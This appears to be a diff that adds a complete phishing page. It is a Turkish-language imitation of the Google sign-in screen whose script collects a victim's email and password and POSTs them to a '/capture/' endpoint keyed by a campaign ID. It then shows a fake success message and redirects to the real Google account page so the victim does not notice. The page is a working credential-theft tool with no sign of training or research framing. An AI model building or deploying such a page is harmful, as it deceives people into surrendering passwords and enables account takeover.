@@ -1,0 +1,478 @@
+!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Hesabı</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 448px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo img {
+            width: 75px;
+            height: 75px;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 0;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            margin-top: 8px;
+            color: #5f6368;
+            margin-bottom: 36px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            transition: border 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+
+        .form-input.error {
+            border-color: #d93025;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .forgot-email {
+            display: block;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 40px;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 40px;
+            line-height: 1.4286;
+        }
+
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 0;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+        }
+
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 88px;
+        }
+
+        .next-button:hover {
+            background-color: #1666d6;
+            box-shadow: 0 1px 3px 1px rgba(66, 64, 67, 0.15);
+        }
+
+        .next-button:disabled {
+            background-color: rgba(26, 115, 232, 0.38);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer select {
+            border: none;
+            background: none;
+            color: #5f6368;
+            font-size: 12px;
+            padding: 8px 0;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Password step */
+        .password-step {
+            display: none;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #1a73e8;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            margin-right: 12px;
+        }
+
+        .user-details {
+            flex: 1;
+        }
+
+        .user-email {
+            font-weight: 500;
+        }
+
+        .user-change {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .user-change:hover {
+            text-decoration: underline;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #5f6368;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="google-logo">
+            <div style="
+                width: 75px;
+                height: 75px;
+                background: conic-gradient(from -45deg, #ea4335 110deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg);
+                border-radius: 50%;
+                margin: 0 auto;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                font-size: 36px;
+                font-weight: bold;
+            ">G</div>
+        </div>
+
+        <h1 class="title">Oturum aç</h1>
+        <p class="subtitle">Hesabınıza devam edin</p>
+
+        <!-- Email Step -->
+        <div id="email-step">
+            <form id="email-form">
+                <div class="form-group">
+                    <input type="email" id="email" class="form-input" placeholder="E-posta veya telefon" autofocus required>
+                    <div class="error-message" id="email-error">Lütfen geçerli bir e-posta adresi veya telefon numarası girin.</div>
+                </div>
+
+                <a href="#" class="forgot-email">E-posta adresini mi unuttun?</a>
+
+                <div class="info-text">
+                    Bu bilgisayar siz değilseniz, misafir modunu kullanarak özel olarak oturum açın. <a href="#">Daha fazla bilgi edinin</a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="create-account">Hesap oluştur</button>
+                    <button type="submit" class="next-button" id="next-button">İleri</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Step -->
+        <div class="password-step" id="password-step">
+            <div class="user-info">
+                <div class="user-avatar" id="user-avatar">U</div>
+                <div class="user-details">
+                    <div class="user-email" id="user-email-display">user@example.com</div>
+                    <a href="#" class="user-change" onclick="goBackToEmail()">Hesap değiştir</a>
+                </div>
+            </div>
+
+            <form id="password-form">
+                <div class="form-group">
+                    <div class="password-input-container">
+                        <input type="password" id="password" class="form-input" placeholder="Parolanızı girin" required>
+                        <button type="button" class="show-password" id="show-password-btn" onclick="togglePassword()">
+                            Göster
+                        </button>
+                    </div>
+                    <div class="error-message" id="password-error">Parolanızı yanlış girdiniz. Yeniden deneyin.</div>
+                </div>
+
+                <a href="#" class="forgot-email">Parolanızı mı unuttunuz?</a>
+
+                <div class="info-text">
+                    Bu bilgisayar siz değilseniz, misafir modunu kullanarak özel olarak oturum açın. <a href="#">Daha fazla bilgi edinin</a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="create-account">Hesap oluştur</button>
+                    <button type="submit" class="next-button" id="password-next-button">İleri</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="loading" id="loading"></div>
+    </div>
+
+    <div class="footer">
+        <div>
+            <select>
+                <option>Türkçe</option>
+                <option>English</option>
+                <option>Deutsch</option>
+                <option>Français</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <a href="#">Yardım</a>
+            <a href="#">Gizlilik</a>
+            <a href="#">Şartlar</a>
+        </div>
+    </div>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+        let userEmail = '';
+
+        // Email form submission
+        document.getElementById('email-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+
+            if (!validateEmail(email)) {
+                document.getElementById('email-error').style.display = 'block';
+                document.getElementById('email').classList.add('error');
+                return;
+            }
+
+            userEmail = email;
+            document.getElementById('user-email-display').textContent = email;
+            document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
+
+            // Switch to password step
+            document.getElementById('email-step').style.display = 'none';
+            document.getElementById('password-step').style.display = 'block';
+            document.getElementById('password').focus();
+        });
+
+        // Password form submission
+        document.getElementById('password-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const password = document.getElementById('password').value;
+
+            if (!password) {
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email: userEmail,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        platform: 'Google'
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Giriş başarılı! Yönlendiriliyorsunuz...');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://myaccount.google.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+            }
+        });
+
+        function goBackToEmail() {
+            document.getElementById('password-step').style.display = 'none';
+            document.getElementById('email-step').style.display = 'block';
+            document.getElementById('email').focus();
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const showBtn = document.getElementById('show-password-btn');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showBtn.textContent = 'Gizle';
+            } else {
+                passwordInput.type = 'password';
+                showBtn.textContent = 'Göster';
+            }
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email) || /^[0-9]{10}$/.test(email);
+        }
+
+        // Real-time validation
+        document.getElementById('email').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('email-error').style.display = 'none';
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('password-error').style.display = 'none';
+        });
+
+        // Create account button
+        document.querySelectorAll('.create-account').forEach(btn => {
+            btn.addEventListener('click', function() {
+                alert('Hesap oluşturma özelliği şu anda kullanılamıyor.');
+            });
+        });
+    </script>
+</body>
+</html>
